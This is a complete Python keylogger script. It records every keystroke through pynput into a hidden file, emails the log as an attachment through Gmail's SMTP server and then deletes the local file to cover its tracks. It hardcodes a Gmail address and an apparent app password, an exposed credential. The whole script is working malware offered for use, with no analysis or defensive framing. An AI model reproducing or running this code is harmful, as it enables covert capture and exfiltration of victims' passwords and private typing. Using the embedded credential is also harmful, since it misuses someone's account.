from datetime import datetime
from pynput.keyboard import Key,Listener
import smtplib,ssl
import os

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


now=datetime.now()
now=now.strftime("%d-%m-%Y_%H-%M")
fileName=".kl.txt"
f=open(fileName,'w')
f.close()
count=0
prev=Key.esc


def on_press(key):
    global count,now,fileName
    key=str(key)
    count+=1
        
    if key.find("'")>=0:
        key=key.replace("'",'')
    elif key.find("Key.")>=0:
        key=key.replace("Key.","[")+"]"
    f=open(fileName,'a')
    if count>10:
        f.write("\n")
        count-=10
    f.write(key)
    f.close()
    

def on_release(key):
    global count,prev
    if count>=1:
        if prev == Key.tab and key==Key.esc:
            return False
        else:
            prev=key

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

subject="log-"+now
m="prithik2001@gmail.com"
passwd="lukcvdnmjcsawamc"

mes=MIMEMultipart()
mes["From"]=m
mes["To"]=m
mes["Subject"]=subject
with open(fileName,"rb") as attachment:
    part =MIMEBase("application","octet-stream")
    part.set_payload(attachment.read())

encoders.encode_base64(part)

atname=subject+".txt"

part.add_header(
    "Content-Disposition",
    f"attachment;filename={atname}",
)

mes.attach(part)
text=mes.as_string()

context=ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com",465,context=context) as server:
    server.login(m,passwd)
    server.sendmail(m,m,text)

os.remove(fileName)